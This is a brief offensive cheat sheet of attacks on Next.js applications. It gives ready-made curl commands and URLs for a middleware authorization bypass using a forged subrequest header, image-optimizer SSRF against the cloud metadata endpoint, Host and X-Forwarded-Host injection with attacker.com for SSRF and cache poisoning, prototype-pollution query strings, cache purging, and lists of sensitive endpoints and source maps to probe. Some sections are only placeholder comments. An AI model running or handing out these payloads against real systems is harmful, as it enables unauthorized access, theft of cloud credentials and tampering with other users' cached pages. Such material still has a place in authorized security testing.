# Next.js Attacks

## 1. Server-Side Request Forgery via Server Actions
```javascript
// Next.js Server Actions can be vulnerable to SSRF
// POST /_next/data/<buildId>/page.json
// Manipulate server action parameters
```

## 2. Middleware Bypass (CVE-2025-29927)
```bash
# Next.js < 15.2.3 middleware auth bypass
# Add x-middleware-subrequest header
curl -sk "http://target/admin" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```

## 3. API Route Exposure
```
/api/auth/[...nextauth]
/api/users
/api/admin
/api/debug
/api/health
/api/config
/api/env
/_next/data/
```

## 4. Server-Side Rendering (SSR) Injection
```javascript
// Prototype pollution in SSR
// Manipulate query parameters that affect rendering
http://target/page?__proto__[shell]=id
```

## 5. Next.js Image Optimization SSRF
```bash
# Image optimization endpoint
http://target/_next/image?url=http://169.254.169.254/latest/meta-data/&w=100
# Bypass URL validation
http://target/_next/image?url=http://attacker.com@169.254.169.254& w=100
```

## 6. Static File Disclosure
```
/_next/static/
/_next/static/chunks/
/_next/static/css/
/_next/data/
```

## 7. Environment Variable Leak
```
# If .env exposed
/api/debug
/_next/data/<buildId>/page.json
# SSR data leak
http://target/_next/data/<buildId>/page.json
```

## 8. NextAuth.js Vulnerabilities
```bash
# Default credentials
# CSRF in signout
# Session token manipulation
# OAuth misconfiguration
```

## 9. Turbopack SSRF (CVE-2024-34350)
```bash
# Turbopack dev server SSRF
# Next.js < 14.2.5
curl -sk "http://target:3000/_next/webpack-hmr" -H "Host: attacker.com"
```

## 10. Cache Poisoning
```bash
# X-Forwarded-Host manipulation
curl -sk "http://target/page" -H "X-Forwarded-Host: attacker.com"
# Affects cached responses
```

## 11. Source Map Exposure
```
/_next/static/chunks/pages/*.js.map
/_next/static/chunks/webpack.js.map
```

## 12. Incremental Static Regeneration (ISR) Abuse
```bash
# Purge ISR cache
curl -sk -X PURGE "http://target/page"
```

## 13. React Server Component Injection
```javascript
// RCE via serialized component data
// Manipulate RSC payload
```

## Detection
```bash
# Check Next.js version
curl -sk "http://target/" -I | grep -i "x-powered-by: Next.js"
# Common endpoints
curl -sk "http://target/_next/static/"
curl -sk "http://target/api/"
```
